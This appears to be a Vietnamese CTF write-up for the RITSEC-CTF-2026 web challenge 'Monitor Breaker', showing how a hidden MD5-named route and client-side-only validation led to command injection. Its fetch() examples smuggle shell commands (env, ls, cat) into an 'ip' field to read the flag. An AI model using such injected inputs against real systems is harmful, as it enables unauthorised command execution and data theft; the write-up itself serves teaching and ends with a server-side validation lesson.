---
layout: single
title: "[RITSEC-CTF-2026] Monitor Breaker - Command Injection qua Client-Side Filter"
date: 2026-04-07
classes: wide
categories: [CTF, RITSEC-CTF-2026, web]
tags: [web, command-injection, ritsec, client-side-bypass]
header:
  teaser: /assets/images/tournaments/ritsec.jpg
---

## Challenge Info

**Event:** RITSEC-CTF-2026  
**Category:** Web  
**Points:** 415  
**Vulnerability:** Command Injection

---

## Đọc đề

> "A maintenance interface leaked into production. Your job: interact with the system monitors and extract the flag from this broken console."

Maintenance interface bị leak ra production — đây là kiểu hint kinh điển, nghĩa là có một thứ gì đó đang ẩn mà không nên ẩn như vậy.

---

## Enumerate

Trang chủ là một System Admin Portal với 3 mục:

- **Network Health** — nút onClick chỉ hiện `alert('This section is under maintenance')`, không có href
- **Performance Monitor** → `/_sys/c4ca4238a0b923820dcc509a6f75849b`
- **System Logs** → `/_sys/c81e728d9d4c2f636f067f89cc14862c`

Nhìn vào hai hash kia, mình nhận ra ngay:
- `c4ca4238...` = MD5("1")
- `c81e728d...` = MD5("2")

Vậy nút Network Health (bị ẩn) rất có thể tương ứng với MD5("0") = `cfcd208495d565ef66e7dff9f98764da`.

Thử truy cập `/_sys/cfcd208495d565ef66e7dff9f98764da` → có một trang **Network Ping Tool**. Bingo.

![Dashboard](/assets/images/monitor-breaker-writeup/image1.png)

---

## Phân tích Ping Tool

![Ping Tool](/assets/images/monitor-breaker-writeup/image2.png)

Form cho phép nhập địa chỉ IP và ping. Nhưng khi xem JS source, thấy có validation chặn ký tự chữ cái — về cơ bản là chỉ cho nhập số và dấu chấm.

Vấn đề là validation này **chỉ chạy ở client-side** (trong browser). Server không có bất kỳ kiểm tra nào thêm.

Bypass đơn giản: dùng DevTools Console để gửi POST request thủ công, bỏ qua hẳn cái form:

```javascript
fetch('/_sys/cfcd208495d565ef66e7dff9f98764da', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'ip=127.0.0.1; env'
}).then(r => r.text()).then(console.log)
```

Server execute lệnh và trả về output của `env`.

![Kết quả env](/assets/images/monitor-breaker-writeup/image3.png)

Flag trong biến môi trường trống. Tìm trong filesystem.

---

## Tìm flag

Đổi lệnh sang `ls` để liệt kê thư mục hiện tại (`/app`):

```javascript
body: 'ip=127.0.0.1; ls'
```

Output có file `flag-9d444ad0f475b52e79a1713f25646dce.txt`.

![ls output](/assets/images/monitor-breaker-writeup/image4.png)

```javascript
body: 'ip=127.0.0.1; cat flag-9d444ad0f475b52e79a1713f25646dce.txt'
```

**Flag:** `RS{1_br0k3_17_e6ebced80740d006889f26ceeeee666b}`

---

## Tóm lại

Attack chain:
1. Xem source HTML → phát hiện pattern MD5 hash của số nguyên
2. Bruteforce số 0 → tìm ra route ẩn
3. JS validation chỉ ở browser → bypass bằng raw `fetch()`
4. Command injection thẳng → `ls` + `cat` để lấy flag

Bài học chính: **client-side validation không phải là security**. Bất kỳ request nào từ browser cũng có thể bị modify hoặc bypass. Input validation phải nằm ở server.
